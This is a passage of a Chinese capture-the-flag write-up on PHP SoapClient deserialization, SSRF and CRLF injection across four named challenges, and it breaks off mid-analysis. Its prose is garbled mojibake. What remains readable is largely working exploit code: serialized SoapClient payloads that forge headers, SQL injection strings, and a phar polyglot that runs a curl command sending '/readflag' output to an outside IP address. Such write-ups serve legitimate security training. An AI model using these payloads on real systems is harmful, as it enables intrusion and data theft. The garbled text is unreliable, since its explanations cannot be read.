title="çœŸé¢˜"></a>çœŸé¢˜</h1><p>å¹²è¯´é“ç†æ˜¯ä¸å¤Ÿçš„ï¼Œè¿™é‡Œç›´æ¥æŠŠå‡ å¤©æ¥åšåˆ°çš„çœŸé¢˜åˆ†æä¸‹ã€‚</p><p> è¸©å‘ï¼š windowsä¸‹å¼€å¯SoapClient:<br>SoapClientç”¨åˆ°çš„æ˜¯phpæ‰©å±•ï¼Œéœ€è¦åœ¨php.iniå¯ç”¨ä¸‰ä¸ªåŠ¨æ€é“¾æ¥åº“</p><ul><li>php_soap.dll</li><li>php_openssl.dll</li><li>php_curl.dll                     </li></ul><p>è¿™é‡Œæˆ‘çš„iniæ–‡æœ¬ä¸­å¼€å§‹åªæ‰¾åˆ°ä¸€ä¸ªæœªå¯ç”¨çš„åº“<code>;extension=php_curl.dll</code>ï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨phpçš„æ–‡ä»¶å¤¹çš„exté‡Œåº”è¯¥æ˜¯å¯ä»¥å…¨éƒ¨æ‰¾åˆ°çš„ã€‚æ‰€ä»¥éœ€è¦æŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶åéƒ½å¯ç”¨ï¼ˆå³å»æ‰å¼€å¤´åˆ†å·ï¼‰ï¼Œå¹¶ä»¤å…¶ç­‰äºå¯¹åº”çš„æ‰©å±•è·¯å¾„ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨SoapClientäº†ã€‚</p><p>Linuxå®‰è£…ä¸€æŠŠæ¢­å°±å¥½ï¼Œä¸å¿…å¤šè¯´ã€‚</p><h2 id="bestphpâ€™s-revenge"><a href="#bestphpâ€™s-revenge" class="headerlink" title="bestphpâ€™s revenge"></a>bestphpâ€™s revenge</h2><p>é¢˜ç›®æºç <br>index.php</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$b = &#39;implode&#39;;call_user_func($_GET[&#39;f&#39;], $_POST);session_start();if (isset($_GET[&#39;name&#39;])) {    $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];}var_dump($_SESSION);$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);call_user_func($b, $a);?&gt;</code></pre><p>flag.php</p><pre><code class="php">session_start();echo &#39;only localhost can get flag!&#39;;$flag = &#39;LCTF{*************************}&#39;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){       $_SESSION[&#39;flag&#39;] = $flag;   }</code></pre><p>é¢˜ç›®æœ‰å‡ ä¸ªé‡ç‚¹ï¼Œæˆ‘ä»¬å…ˆä»ç»“æœçœ‹èµ·ã€‚<br>flagåœ¨flag.phpä¸­ï¼Œæƒ³è¦è¯»åˆ°flagï¼Œå¿…ç„¶éœ€è¦ä»127.0.0.1è®¿é—®ï¼Œç„¶åflagä¼šè¢«ä¿å­˜åœ¨sessionå€¼ä¸­ã€‚æ˜¾ç„¶æ˜¯ä¸ªssrfäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹index.phpä¸­çš„ä»£ç <br><code>var_dump($_SESSION);</code><br>é¦–å…ˆç¡®è®¤sessionçš„å€¼ä¼šè¢«æ‰“å°å‡ºæ¥ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œé‚£çœ‹æ¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ssrfäº†ã€‚å†æ¥çœ‹çœ‹å…¶ä»–å‡½æ•°éœ€è¦æ€ä¹ˆåˆ©ç”¨ã€‚<br>å¾ˆå”çªçš„ä¸€ä¸ª<code>$b = &#39;implode&#39;;</code>+<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>ä»¥åŠæœ€åä¸€ä¸ª<code>call_user_func($b, $a);</code><br>è¿™é‡Œbç´§æ¥ç€ä¸€ä¸ª<code>call_user_func</code>çœ‹æ¥æ˜¯å¯ä»¥å˜é‡è¦†ç›–äº†ã€‚<br>é‚£ä¹ˆå¦‚æœè¦†ç›–äº†çš„è¯ï¼Œè¦†ç›–æˆä»€ä¹ˆï¼Œåˆæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ<br>è¿™é‡Œéœ€è¦çŸ¥é“ä¸€ç‚¹ï¼š</p><ul><li>call_user_func()å‡½æ•°å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯arrayç±»å‹çš„è¯ï¼Œä¼šå°†æ•°ç»„çš„æˆå‘˜å½“åšç±»åå’Œæ–¹æ³•</li></ul><p>â€˜å‡å¦‚æˆ‘ä»¬ä¸€å¼€å§‹åˆ©ç”¨få°†bè¦†ç›–æˆ <code>call_user_func()</code>ï¼Œé‚£ä¹ˆåœ¨index.phpçš„æœ€åï¼Œå‡½æ•°å°†æ‰§è¡Œ<br><code>calluserfunc(calluserfunc,array($_session,â€˜welcome_to_the_lctf2018â€™))</code><br>ç”±äº<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>å¯æ§ï¼Œå¦‚æœä»¤name=SoapClientï¼Œä¸å°±æˆäº†</p><pre><code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code></pre><p>å—ï¼Ÿ<br>å‰é¢æåˆ°ï¼Œå¦‚æœSoapClientå­˜åœ¨<code>__call()</code>é­”æœ¯æ–¹æ³•ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•å°†ç›´æ¥è§¦å‘æˆ‘ä»¬æ‰€éœ€è¦çš„ssrf.<br>é‚£ä¹ˆæ•´ä¸ªæµç¨‹çš„æœ€åä¸€æ­¥å¯ä»¥å…ˆè¡Œæ„é€ ï¼š</p><pre><code class="php">&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null,array(&#39;location&#39; =&gt; $target,    &#39;user_agent&#39; =&gt; &quot;byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,    &#39;uri&#39; =&gt; &quot;123&quot;));$payload = urlencode(serialize($attack));echo $payload;?&gt;</code></pre><p>æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè¿˜ç”¨åˆ°äº†æˆ‘ä»¬ä¸Šé¢æåˆ°çš„CRLFæ¼æ´</p><pre><code>  &#39;user_agent&#39; =&gt; &quot;byc\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,</code></pre><p>çœ‹ï¼Œåªè¦\r\nï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è®¿é—®æ—¶çš„Cookie,è¿™æ ·æœ€åç”Ÿæ•ˆçš„flagä¹Ÿä¼šè¢«ä¿å­˜åœ¨æˆ‘ä»¬å¯æ§çš„cookieä¸­</p><p>ä¸‹é¢è¦æ€è€ƒçš„å°±æ˜¯ï¼Œæ€ä¹ˆè§¦å‘ååºåˆ—åŒ–å‘¢ï¼Ÿè”ç³»åˆ°é¢˜ç›®ä¸­æ•æ„Ÿçš„sessionå­˜å‚¨ï¼Œè‡ªç„¶å¯ä»¥è”æƒ³åˆ°æŸä¸ªä¸ç”¨<code>unserialize</code>ä¹Ÿèƒ½è§¦å‘çš„ååºåˆ—åŒ–æ¼æ´ï¼šphpsessionå¤„ç†å™¨å¼•æ“ä¸ä¸€è‡´å¯¼è‡´çš„ååºåˆ—åŒ–ã€‚<br>é‚£ä¹ˆé—®é¢˜å°±è§£å†³äº†ï¼šæˆ‘ä»¬åœ¨æœ€å¼€å§‹å°±ä»¤å¼•æ“ä¸º<code>php_serialize</code>ï¼Œå¹¶å°†åºåˆ—åŒ–æ•°æ®å­˜å‚¨åˆ°sessionä¸­ã€‚ç„¶ååœ¨ç¬¬äºŒæ¬¡æ‰è¿›è¡Œssrfã€‚æ­¤æ—¶ç”±äºå¤„ç†å™¨é‡æ–°å˜å›phpï¼Œå°†è§¦å‘ååºåˆ—åŒ–ï¼Œä»è€Œè§¦å‘ssrfï¼Œå°†flagå­˜å‚¨åœ¨å¯æ§cookieä¸­ã€‚æœ€åæ¢cookieè®¿é—®å³å¯ã€‚<br>pocï¼š</p><pre><code>1.f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5......åŒæ—¶post serizliaze_handler=php_serializeè¿™æ ·æ‰§è¡Œçš„å°±æ˜¯session_start(&quot;serialize_handler&quot;:&#39;php_serialize&#39;)æˆ‘ä»¬çš„æ•°æ®è¢«æˆåŠŸå†™å…¥session2.f=extract&amp;name=SoapClientåŒæ—¶post b=calluserfuncè¿™æ ·æ‰§è¡Œçš„å°±æ˜¯calluserfunc(calluserfunc,array($_session,â€˜welcome_to_the_lctf2018â€™))</code></pre><p>æœ€åæ¢cookieè®¿é—®index.phpå°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h2 id="De1CTF-shellshellshell"><a href="#De1CTF-shellshellshell" class="headerlink" title="De1CTF shellshellshell"></a>De1CTF shellshellshell</h2><p>è¶…çº§éº»çƒ¦çš„ä¸€é“é¢˜â€¦â€¦<br>å¯èƒ½æ˜¯å› ä¸ºæˆ‘æ‡’å¾—å†™è‡ªåŠ¨åŒ–è„šæœ¬å§ã€‚çœ‹åˆ°èµµå¸ˆå‚…çš„wpç›´æ¥è‡ªåŠ¨åŒ–ä¸€æŠŠæ¢­ç¾¡æ…•ä¸å·²ã€‚<br>è¿™é¢˜å…¶ä»–ç»†èŠ‚æˆ‘å°±ä¸è®²äº†ï¼Œä¸»è¦é‡ç‚¹è®²è®²ä¸­é—´åˆ©ç”¨Soapçš„éƒ¨åˆ†<br>é¦–å…ˆé¢˜ç›®åœ¨ç™»å½•è¿›å»åæœ‰ä¸ªç‚¹ï¼Œè¿™é‡Œ<code>signature</code>å˜é‡å¯ä»¥æ„é€ ä¸‹æ—¶é—´ç›²æ³¨ã€‚å› ä¸ºåå¼•å·+æ­£åˆ™æ›¿æ¢çš„ä½¿ç”¨ä¸å½“ï¼Œå¯¼è‡´äº†å¯æ³¨çš„åœ°æ–¹ï¼Œäºæ˜¯å¯ä»¥å¾—åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç ã€‚<br>å¤§æ¦‚æ˜¯è¿™ç§å½¢å¼å§</p><pre><code>1` or sleep(3) ,1)# </code></pre><p>ä½†æ˜¯å°è¯•ç™»å½•æ—¶å´æç¤ºéœ€è¦ä»æœ¬åœ°ç™»è¿›ï¼Œè¿™å°±æ˜¯è¯´è¦ssrfäº†ã€‚æ€ä¹ˆè¾¾æˆå‘¢?<br>å› ä¸ºæˆ‘ç¯å¢ƒæ‡’å¾—é‡å¼€äº†ï¼Œå€Ÿç”¨ä¸‹å…¶ä»–å¸ˆå‚…çš„å›¾<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è™½ç„¶å°†moodå‚æ•°è½¬intå¹¶addshalshesäº†ï¼Œä½†æ˜¯åé¢moodå‚æ•°åœ¨å¯ä»¥æ³¨å…¥çš„signnatureå‚æ•°åé¢ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ³¨å…¥å°†å…¶ç›´æ¥æ³¨é‡Šæ‰ï¼Œæ¥æ³¨å…¥ä¸€ä¸ªæˆ‘ä»¬çš„æ¶æ„åºåˆ—åŒ–å¯¹è±¡<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åè°ƒç”¨äº†ä¸€ä¸ªgetcountry()æ–¹æ³•ï¼Œç»“åˆæˆ‘ä»¬ä¹‹å‰çš„éœ€æ±‚ï¼Œæ­£å¥½å¯ä»¥ä½¿ç”¨SoapClientã€‚åªè¦ä½¿ç”¨Soapæ„é€ ä¸€ä¸ªç™»é™†adminçš„è¯·æ±‚ï¼Œåºåˆ—åŒ–åæ’å…¥æ•°æ®åº“ï¼Œè¿™é‡Œè°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•æ—¶å°±èƒ½ç›´æ¥è§¦å‘<code>__call()</code>è¿›è€Œè§¦å‘ssrfã€‚</p><pre><code class="php">&lt;?php$target = &quot;http://127.0.0.1/index.php?action=login&quot;;$post_string = &#39;username=admin&amp;password=jaivypassword&amp;code=4153792&#39;;$headers = array(    &#39;Cookie: PHPSESSID=pu1bnms95shhapubhqoh9vk7h2&#39;,);$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;byc^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string.&#39;^^&#39;,&#39;uri&#39;=&gt;&#39;hello&#39;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);echo &#39;0x&#39;.bin2hex($aaa);?&gt;</code></pre><p>ç¨å¾®è§£é‡Šä¸‹è¦ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ssrfç™»å½•adminï¼Œé‚£ä¹ˆåˆ°æ—¶å€™ååºåˆ—åŒ–è§¦å‘å®Œäº†ï¼Œæˆ‘ä»¬è‡ªå·±ç™»è¿›å»ï¼Œéœ€è¦çš„å°±æ˜¯ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„cookieã€‚<br>åŒæ—¶å› ä¸ºè¦æ„é€ çš„è¯·æ±‚å¿…é¡»æ˜¯ç™»å½•æ—¶åŒ…å«äº†adminçš„è´¦å·å¯†ç ä»¥åŠéªŒè¯ç çš„æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦postè¯·æ±‚ã€‚è¿™é‡Œåˆä¸€æ¬¡ç”¨åˆ°CRLFï¼Œæ¥æ§åˆ¶Content-Typeï¼ŒContent-Length,è¾¾æˆpostè¯·æ±‚çš„æ¡ä»¶ã€‚</p><p>é‚£ä¹ˆæ­¤æ—¶æœ€å¥½é‡å¼€ä¸€ä¸ªæµè§ˆå™¨ï¼Œç›´æ¥ä½¿ç”¨æ–°ç•Œé¢çš„cookieä»¥åŠç®—å¥½çš„éªŒè¯ç æ”¾åˆ°è„šæœ¬ä¸­ï¼Œå¾—åˆ°16è¿›åˆ¶çš„åºåˆ—åŒ–æ•°æ®ã€‚ç„¶ååœ¨å·²ç»ç™»å½•çš„ä½ç½®æ³¨å…¥åºåˆ—åŒ–æ•°æ®ã€‚è¿™æ—¶ä¼šè‡ªåŠ¨è·³åˆ°indexç•Œé¢ï¼Œè§¦å‘åºåˆ—åŒ–ã€‚ï¼ˆæˆ‘ç›´æ¥é‡åˆ°500,ä½†æ˜¯ä¸å½±å“ï¼‰ä¹‹åå†å›åˆ°åŸå…ˆæœªç™»å½•çš„åœ°æ–¹ç™»å½•å°±å¥½äº†ã€‚</p><p>åé¢çš„éƒ¨åˆ†ä¸æäº†ï¼Œæ˜¨å¤©åšäº†æˆ‘ä¸€ä¸‹åˆâ€¦â€¦å¯ä»¥å‚è€ƒèµµå¸ˆå‚…æˆ–è€…å…¶ä»–å¸ˆå‚…çš„wp<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a><br><a href="https://blog.csdn.net/chasingin/article/details/104687766" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104687766</a></p><h2 id="SUCTF-UploadLabs2"><a href="#SUCTF-UploadLabs2" class="headerlink" title="SUCTF UploadLabs2"></a>SUCTF UploadLabs2</h2><p>è¿™é¢˜ä¹Ÿæ˜¯ç»™å‡ºæºç ï¼Œç„¶åå®¡è®¡<br>é¦–å…ˆæ˜¯Adç±»ä¸€ä¸ªè¯±äººçš„ææ„æ–¹æ³•</p><pre><code class="php">function __destruct(){        system($this-&gt;cmd);    }</code></pre><p>æ¥çœ‹çœ‹è¾¾æˆæ¡ä»¶<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>éœ€è¦ssrfï¼Œä¸ç”¨è¯´è¿™é‡Œåº”è¯¥åˆå¯ä»¥æƒ³åˆ°æˆ‘ä»¬çš„Soapç±»äº†ã€‚<br>ç„¶åçœ‹çœ‹æœ‰æ²¡æœ‰å¯ç”¨çš„æ–¹æ³•ï¼Œå¾ˆå¿«åœ¨Fileç±»ä¸­æ‰¾åˆ°</p><pre><code class="php">    function __wakeup(){        $class = new ReflectionClass($this-&gt;func);        $a = $class-&gt;newInstanceArgs($this-&gt;file_name);        $a-&gt;check();    }</code></pre><p>è¿™é‡ŒReflectionClassæ˜¯phpä¸­åå°„ç±»çš„æ„æ€ã€‚æ‰€ä»¥å…¶å®wakeupçš„å‰ä¸¤è¡Œå°±æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡çš„ä½œç”¨</p><pre><code>$class = new ReflectionClass(&#39;Person&#39;); // å»ºç«‹ Personè¿™ä¸ªç±»çš„åå°„ç±»  $instance  = $class-&gt;newInstanceArgs($args); // ç›¸å½“äºå®ä¾‹åŒ–Person ç±» </code></pre><p>åŠ ä¸Šé‚£ä¸ª<code>$a-&gt;check();</code>æˆ‘ä»¬åŸºæœ¬ç¡®å®šè¿™é‡Œå°±æ˜¯ç”¨Soapç±»æ¥æ„é€ äº†ã€‚<br>æ¥ä¸‹æ¥è”ç³»func.phpä¸­ä¼ å‚å®ä¾‹åŒ–Fileå¯¹è±¡çš„åšæ³•ï¼Œ</p><pre><code class="php">  $file_path = $_POST[&#39;url&#39;];        $file = new File($file_path);        $file-&gt;getMIME();        echo &quot;&lt;p&gt;Your file type is &#39;$file&#39; &lt;/p&gt;&quot;;</code></pre><p>ä¸éš¾æƒ³åˆ°ä½¿ç”¨pharæ¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¿™æ ·æˆ‘ä»¬çš„Fileç±»åœ¨å®ä¾‹åŒ–åï¼Œè¢«è§¦å‘ååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>__wakeup()</code>ï¼Œåªè¦funcæ˜¯<code>SoapClient</code>å°±èƒ½è¿›è¡Œåç»­çš„ssrfï¼Œè¾¾æˆä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><pre><code class="php">&lt;?phpclass File{    public $file_name;    public $func=&#39;SoapClient&#39;;    function __construct(){        $target = &quot;http://127.0.0.1/admin.php&quot;;        $post_string = &#39;admin=&amp;cmd=curl http://174.1.28.1:8877/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;        $headers = [];        $this-&gt;file_name=[            null,            array(&#39;location&#39; =&gt; $target,                &#39;user_agent&#39;=&gt;str_replace(&#39;^^&#39;, &quot;\r\n&quot;,&#39;byc^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string.&#39;^^&#39;)            ,&#39;uri&#39;=&gt;&#39;hello&#39;)        ];    }}$a=new File();echo urlencode(serialize($a));@unlink(&quot;1.phar&quot;);$phar = new Phar(&quot;1.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;script language=&#39;php&#39;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;); //è®¾ç½®stub$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering();rename(&#39;1.phar&#39;,&#39;1.jpg&#39;);</code></pre><p>åŒæ ·æå‡ ä¸ªç»†èŠ‚ï¼š</p><ul><li>Soapçš„å‚æ•°ä¸­file_nameè¢«è®¾ä¸ºæ•°ç»„æ˜¯åå°„ç±»çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œå®ƒæ¥æ”¶çš„æ˜¯æ•°ç»„å‚æ•°ã€‚</li><li>pharçš„æ–‡ä»¶åå·²ç»æ”¹æˆjpgäº†ï¼Œä½†æ˜¯ä¸ºäº†è¿‡ä¸€ä¸ªæ–‡ä»¶å¤´çš„æ ¡éªŒè¿˜å¾—è®¾å®š<code>$phar-&gt;setStub(&quot;&lt;script language=&#39;php&#39;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;);</code></li><li>postæ•°æ®é™¤äº†cmdè·Ÿadminå¤–ï¼Œè¿˜è¦æ³¨æ„Adåœ¨ææ„å‰è°ƒç”¨çš„å¦å¤–ä¸€ä¸ªcheck()æ–¹æ³•ä¸­æ¥æ”¶çš„å‚æ•°ï¼Œä»–ä»¬éƒ½æ˜¯åå°„ç±»å®ä¾‹åŒ–çš„<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œæˆ‘ä»¬åªéœ€è¦ä¼ å­˜åœ¨çš„ç±»è·Ÿæ–¹æ³•å³å¯ã€‚æ¯”å¦‚SplStackå°±æ˜¯phpæ ‡å‡†åº“é‡Œæ•°æ®ç»“æ„ç±»ï¼Œpushæ–¹æ³•ä¹Ÿæ˜¯è‡ªç„¶å­˜åœ¨çš„ã€‚<br>æ‰€ä»¥ä¸Šä¼ 1.jpg,åœ¨func.phpè°ƒç”¨<br><code>php://filter/resource=phar://upload/76d9f00467e5ee6abc3ca60892ef304e/f3ccdd27d2000e3f9255a7e3e2c48800.jpg</code>è§¦å‘ååºåˆ—åŒ–ã€‚</li></ul><p><del>è¿™é‡Œæˆ‘å¾€buuçš„requestsbinæ‰“payloadæ²¡æ”¶åˆ°</del>ä¸æ­¢æ²¡æ”¶åˆ°ï¼Œç›´æ¥æ­»åœ¨æ–‡ä»¶æµé‚£äº†ã€‚å®ƒæŠ¥çš„æˆ‘æ–‡ä»¶æ˜¯ost-streamã€‚å‘½ä»¤æ‰§è¡Œå¤±è´¥ã€‚</p><p>ç”¨å®ƒçš„å†…ç½‘é¶æœºå°±æ²¡äº‹ï¼Ÿå¥½å§ï¼Œè¿˜æ˜¯æœ‰flagçš„hhh.<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="SWPU2019-web6"><a href="#SWPU2019-web6" class="headerlink" title="SWPU2019 web6"></a>SWPU2019 web6</h2><p>ä¸Šæ¥ä¸€ä¸ªsqlçš„ä¸‡èƒ½å¯†ç ï¼Œç”¨åˆ°äº†<code>with rollup</code>çš„trick<br>1â€™ or â€˜1â€™=â€™1â€™  group by passwd with rollup having passwd is NULL â€“ -<br>æ·»åŠ ä¸€ä¸ªç©ºåˆ—ï¼Œè¿›è¡Œç»“æœåˆ¤æ–­NULL=false<br>ç»•è¿‡å¼±ç±»å‹ç›¸ç­‰</p><p>è¿›å»åå‘ç°wsdl.phpæä¾›äº†ä¸å°‘æ¥å£ï¼Œå…¶ä¸­ä¸€ä¸ªå¯ä»¥è¯»æ–‡ä»¶<br>æŠŠå¯è¯»çš„æ–‡ä»¶è¯»ä¸€ä¸‹<br>index.php</p><pre><code class="php"> &lt;?phpob_start();include (&quot;encode.php&quot;);include(&quot;Service.php&quot;);//error_reporting(0);//phpinfo();$method = $_GET[&#39;method&#39;]?$_GET[&#39;method&#39;]:&#39;index&#39;;//echo 1231;$allow_method = array(&quot;File_read&quot;,&quot;login&quot;,&quot;index&quot;,&quot;hint&quot;,&quot;user&quot;,&quot;get_flag&quot;);if(!in_array($method,$allow_method)){    die(&quot;not allow method&quot;);}if($method===&quot;File_read&quot;){    $param =$_POST[&#39;filename&#39;];    $param2=null;}else{    if($method===&quot;login&quot;)    {        $param=$_POST[&#39;username&#39;];        $param2 = $_POST[&#39;passwd&#39;];    }else    {        echo &quot;method can use&quot;;    }}echo $method;$newclass = new Service();echo $newclass-&gt;$method($param,$param2);ob_flush();?&gt;</code></pre><p>Surface.php</p><pre><code class="php">&lt;?php       include(&#39;Service.php&#39;);    $ser = new SoapServer(&#39;Service.wsdl&#39;,array(&#39;soap_version&#39;=&gt;SOAP_1_2));    $ser-&gt;setClass(&#39;Service&#39;);    $ser-&gt;handle();?&gt;</code></pre><p>se.php</p><pre><code class="php">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);class aa{        public $mod1;        public $mod2;        public function __call($name,$param)  è°ƒç”¨å‡½æ•°ï¼Œæ˜¾ç„¶å¯è·Ÿè¿›åˆ°invoke        {            if($this-&gt;{$name})                {                    $s1 = $this-&gt;{$name};                    $s1();                }        }        public function __get($ke)        {            return $this-&gt;mod2[$ke];        }}class bb{        public $mod1;        public $mod2;        public function __destruct()  å…¥æ‰‹ç‚¹ï¼Œæ˜¾ç„¶å¯è·Ÿè¿›åˆ°__call        {            $this-&gt;mod1-&gt;test2();        }} class cc{        public $mod1;        public $mod2;        public $mod3;        public function __invoke()        {                $this-&gt;mod2 = $this-&gt;mod3.$this-&gt;mod1; æ‹¼æ¥,é‚£ä¹ˆæœ‰å­—ç¬¦ä¸²äº†        } }class dd{        public $name;        public $flag;        public $b;        public function getflag()  æ­¤å¤„å¯ssrfï¼Œåˆ°å¤´äº†        {                session_start();                 var_dump($_SESSION);                $a = array(reset($_SESSION),$this-&gt;flag);                echo call_user_func($this-&gt;b,$a);        }}class ee{        public $str1;        public $str2;        public function __toString()        {                $this-&gt;str1-&gt;{$this-&gt;str2}(); æœ‰å­—ç¬¦ä¸²äº†ï¼Œåªæœ‰ä»–èƒ½è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œå½“ç„¶æ˜¯ssrf                return &quot;1&quot;;        }}$a = $_POST[&#39;aa&#39;];unserialize($a);?&gt;</code></pre><p>encode.php</p><pre><code class="php">&lt;?phpfunction en_crypt($content,$key){    $key    =    md5($key);    $h      =    0;    $length    =    strlen($content);    $swpuctf      =    strlen($key);    $varch   =    &#39;&#39;;    for ($j = 0; $j &lt; $length; $j++)    {        if ($h == $swpuctf)        {            $h = 0;        }        $varch .= $key{$h};        $h++;    }    $swpu  =  &#39;&#39;;    for ($j = 0; $j &lt; $length; $j++)    {        $swpu .= chr(ord($content{$j}) + (ord($varch{$j})) % 256);    }    return base64_encode($swpu);}</code></pre><p>æ‰¾åˆ°ä¸å¯è¯»çš„æ–¹æ³• <code>get_flag</code>ï¼Œå¾—çŸ¥è¦ç‚¹ï¼š</p><p>get_flag  only admin in 127.0.0.1 can get_flag</p><ul><li>ssrf needed</li><li>POPchain needed</li><li>decrypt and be admin</li></ul><p>å…ˆçœ‹popchain</p><pre><code>bb-&gt;__destruct //$mod1 ä¸ºaaå¯¹è±¡    -&gt;aa -&gt;_call()-&gt;$s1(); //$éœ€è¦è°ƒç”¨çš„$s1æ˜¯ä¸ªå¯¹è±¡        